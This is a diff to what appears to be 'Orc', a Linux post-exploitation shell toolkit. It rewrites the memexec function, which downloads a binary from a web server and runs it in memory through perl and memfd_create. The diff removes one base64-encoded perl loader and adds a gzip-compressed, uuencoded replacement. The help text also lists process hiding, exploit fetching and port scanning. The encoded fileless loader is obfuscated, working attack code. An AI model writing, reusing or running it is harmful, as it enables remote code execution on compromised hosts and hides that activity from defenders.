@@ -256,16 +256,6 @@ orc_archive () {
 # in the helper functions section.
 #
 
-memfda=$(cat << EOF
-IyEvdXNyL2Jpbi9lbnYgcGVybAp1c2Ugd2FybmluZ3M7CnVzZSBzdHJpY3Q7CgokfD0xOwoKbXkgJG5hbWUgPSAiIjsKbXkgJGZkID0gc3lzY2FsbCgzMTksICRuYW1lLCAxKTsKaWYgKC0xID09ICRmZCkgewoJZGllOwp9CgpwcmludCAiZmQgJGZkXG4iOwoKb3BlbiAobXkgJEZILCAnPiY9Jy4kZmQpIG9yIGRpZTsKc2VsZWN0ICgoc2VsZWN0KCRGSCksICR8PTEpIFswXSk7CgpwcmludCAkRkggcGFjayBxL0gqLywgcS8K
-EOF
-)
-
-memfdb=$(cat << EOF
-cHJpbnQgImRvbmVcbiI7CmV4ZWN7Ii9wcm9jLyQkL2ZkLyRmZCJ9ICJ0ZXN0IiwgIiIsICIiIG9yIGRpZTsK
-EOF
-)
-
 
 alias 'echo'='/bin/echo'
 
@@ -623,10 +613,13 @@ qsu() {
   rm "$ORC_ECHO_FILE"
 }
 
+
 memexec() {
   # Execute a binary in-memory from webserver.
   # Argument: URL of the binary, http or https is supported.
-  if [ $# -ne 1 ]; then
+  #           other arguments are passed thru to the program
+  local url processname
+  if [ $# -lt 1 ]; then
     echo 'Error: memexec needs URL as argument' >&2
     return 1
   fi
@@ -634,12 +627,30 @@ memexec() {
     echo 'Error: missing perl, can not execute in memory' >&2
     return 1
   fi
-  memfile=$(orc_loadURL "$1" | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
-  finalmem=$(echo "$memfda" | base64 -d)
-  finalmem=${finalmem}$(echo "$memfile/ or die;")
-  finalmem=${finalmem}$(echo "$memfdb" | base64 -d)
-  echo "$finalmem" | perl
+  # first argument is the URL to load
+  url="$1"
+  shift
+  # decode the perl script and run the script
+  ( uudecode |
+    gzip -d |
+    perl - $url '-' "$@"
+  ) << ====end
+begin-base64 660 -
+H4sIAOV7vVwAA41TS4vbMBC++1fMGkNscHDSZE26xktLD73kUDZ9HIMqj2OB
+LbmS3CQk7m+vHqFLCU16kNBo5ntoGEEwKIQ9kZzxnSpcpLRkVPvz+tunp6cN
+6/oW4cc+jgYCO9R2KS0kJr7qg+A12xVBd4RIHRUlbcsllDCdFwGr48jnT0TS
+hpMORyh/QXZY5dt8OW0ZHw5ZAqcA/gYv5m+DEbBV/2Rgi1V+A/+Y38OTW/rz
+xXJ2hyAmsjubhd/PxGbyZXLDz+rxDl0v9ijjnp57mi/d1uItwvyuP9Wbi7Pb
+b3tbrjwVulzFEMLPDVNg+ZhGqgeJYGIuNKih74XUWKUuXU6uxCdhAcEYmGmZ
+PivVbkWvVfwTJauP20YobYugfIZZCpvNenvJdKLyt4mfpEG2xppqWK1BSG+q
+Y0qZSTXCu6FDrlPQDcKXl3XoMb0Uu/8A2TJJOrBGLkjvCcJLWFeWxrcofu1V
+6gtTmCd+tG2dHfTktXGU8IkGKpFoBMIFh5q1BhI9hDA6cupe+ucXxe6tKYSZ
+8UWzKMrqKjPMIVxEXP1DCW9msyudVpDKCUAtRQcKpWlnaj4x0YMCiywd3mrj
+ASmcrmRG37f03fuXj1+L4DeY4yAAFAQAAA==
+====
+====end
 }
+
 
 getpty() {
 SHELL=$(command -v sh)
@@ -940,7 +951,7 @@ A probably non-comprehensive list of functionality in Orc v$OVERSION.
 [*]      getdbus - list all dbus services
 [*]   getexploit - download and run linux-exploit-suggester
 [*]      memexec - execute a binary in-memory from a webserver
-[*]              - memexec [full URI] (x64 only)
+[*]              - memexec [full URI] [program arguments]
 [*]     portscan - run a portscan against common ports - portscan [host]
 [*]     prochide - run a program with $0 changed to the longest entry in ps
 [*]              - prochide [program + args]
